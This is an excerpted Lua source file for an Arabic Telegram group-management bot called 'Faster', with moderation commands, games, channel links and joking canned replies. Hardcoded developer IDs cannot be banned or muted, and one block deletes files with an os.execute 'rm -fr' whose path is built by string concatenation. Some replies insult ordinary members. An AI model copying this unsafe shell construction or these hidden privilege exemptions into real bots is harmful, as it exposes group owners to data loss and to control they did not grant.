local Name = '[《⬇️اتبع الازرار للتواصل مع المطور》](t.me/FA9SH)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
if tonumber(result.sender_user_id_) == tonumber(1804119251 ) then  
send(msg.chat_id_, msg.id_, " لا تستطيع حظر المبرمج سيزر😉❤️.“")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2068516411) then  
send(msg.chat_id_, msg.id_, " لا تستطيع حظر المبرمج سيزر😉❤️.“")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1770493345) then  
send(msg.chat_id_, msg.id_, " لا تستطيع حظر عمك ديشاا😉🌍")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2093265110) then  
send(msg.chat_id_, msg.id_, " انت عبيط ياات د فمبير القااامد😒💛")
return false 
end
...
function(arg,data) 
usertext = '\n ◐ الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'FA9SH')..')'
...
usertext = '\n ◐ الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'FA9SH')..')'
status  = '\n ◐ تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(result.sender_user_id_) == tonumber(1804119251 ) then  
send(msg.chat_id_, msg.id_, " لا تستطيع كتم المبرمج سيزر💛😂.")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(2068516411) then  
send(msg.chat_id_, msg.id_, " لا تستطيع كتم المبرمج سيزر💛😂.")
...
if tonumber(result.sender_user_id_) == tonumber(1770493345) then
send(msg.chat_id_, msg.id_, "  لا تستطيع كتم عمك ديشاا😉🌍")
return false
end
if tonumber(result.sender_user_id_) == tonumber(2093265110) then  
send(msg.chat_id_, msg.id_, " انت عبيط ياات د فمبير القااامد😒💛")
...
local json_file, res = https.request("https://raw.githubusercontent.com/#روبت/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ◐ عذرا الملف لايدعم سورس فاستر\n") 
end
return false
end
...
if text == ("مسح قائمه فاستر") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ◐ تم مسح قائمه فاستر')
return false
end

if text == 'قائمه فاستر' and Sudo(msg) then
...
if text == ("رفع فاستر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع فاستر@(.*)$") and Sudo(msg) then
local username = text:match("^رفع فاستر@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع فاستر(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع فاستر(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل فاستر") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل فاستر@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل فاستر@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل فاستر(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل فاستر(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
' }\n'..' ◐  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' ◐  الرفع  ⇇{ '..setadd..
' }\n'..' ◐  الحظر  ⇇{ '..banm..' }\n\n ◐═───═❲[𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪 ](t.me/FA9SH)❳═───═ ◐\n ◐ قناة سورس فاستر♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡\n [ ❲[𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪 ](t.me/FA9SH)❳](t.me/FA9SH) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
send(msg.chat_id_, msg.id_, t..'♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡\nاضغط علي الاسم ليتم نسخه\n♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡ٴ\n ◐ ❲[𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪 ](t.me/FA9SH)❳ ◐ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'فاستر').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'فاستر')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس فاسترو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
if text == 'حزين' or text == 'بموت' or text == 'حزينه' then
local Text = [[
]]
keyboard = {} 
keyboard.inline_keyboard = {
...
end --الكود حصري سورس فاستريعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'فاستر').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, 'اكتب زخرفه + الاسم للي هتزخرفه مثال زخرفه سيزر ') 
return false
end
...
for k,v in pairs(list) do
if string.find(text,v) ~= nil then
send(msg.chat_id_,msg.id_, 'انت الخير ياعبدوي..❤️ ') 
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..◐♥️](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/FA9SH)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤◐](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..😹](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..◐💕](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/FA9SH)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[القمر مهو بيضكك اهوه ..◐💕](t.me/FA9SH)')
return false
end
end
end
...
"اي الصوره الجمده دي حته من الواد سيزر....🌍",
...
[🎯ألعاب سورس فاستر الاحسن في التليجرام .↑]
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 [𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪 ](t.me/FA9SH)
]]
keyboard = {} 
...
if text == "تعطيل حساب العبدو" and Manager(msg) then
send(msg.chat_id_, msg.id_, ' ◐ تم تعطيل حساب العبدو')
...
if text == "تفعيل حساب العبدو" and Manager(msg) then
send(msg.chat_id_, msg.id_,' ◐ تم تفعيل حساب العبدو')
...
if text == 'تفعيل مريم' then 
send(msg.chat_id_,msg.id_, ' ◐ تـم تـفـعـيـل مريم ') 
return false
end
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡
 اختر الامر الذي تريدها .↑♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡
ده من الازرار بلاسفل . ♡━─⊶🚀𝑭𝑨𝑺𝑻𝑬𝑹🚀⊷─━♡
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
❲[𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪 ](t.me/FA9SH)❳ 
]]
keyboard = {} 
...
{
{text = '𝐕 𝘼 𝙈 𝘽 𝙄 𝙍',url="t.me/XxlllllllllllllllllllllllllllxX"},
},
{
{text = '●𝗕𝗔𝗖𝗞↵', callback_data="/HHH"},
},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessageText?chat_id='..Chat_id..'&text='..URL.escape(Teext)..'&message_id='..msg_idd..'&parse_mode=markdown&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard)) 
end
...
if Text == '/meba' then
local Teext =[[
↻اهـلا بـكـم فـي قـسـم قـنـوات سـورس كـيـنـج↺
]]
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '★𝗦𝗢𝗨𝗥𝗖𝗘 𝗞𝗜𝗡𝗚⤶',url="t.me/FA9SH"},{text = '★𝗣𝗢𝗦𝗧𝗔𝗧⤶', url="t.me/UU_CH"},
},
{
{text = '𝗧𝗪𝗟',url="t.me/K_I_N_G_1_2_3"},
}, 
{
{text = '●𝗕𝗔𝗖𝗞↵', callback_data="/HHH"},
},
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '●𝙳𝙴𝚅 𝚂𝙴𝚉𝚁𓆩●',url='http://t.me/s_e_z_r0 '}},
}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪',url='http://t.me/FA9SH'}},
}
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝑭𝑨𝑺𝑻𝑬𝑹⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝑭𝑨𝑺𝑻𝑬𝑹⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[𓆩● 𝑭𝑨𝑺𝑻𝑬𝑹 ●𓆪 ](t.me/FA9SH)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'فاستر')
...
"صراحه  |  صدفة العبدو الحلوة هي اني؟",
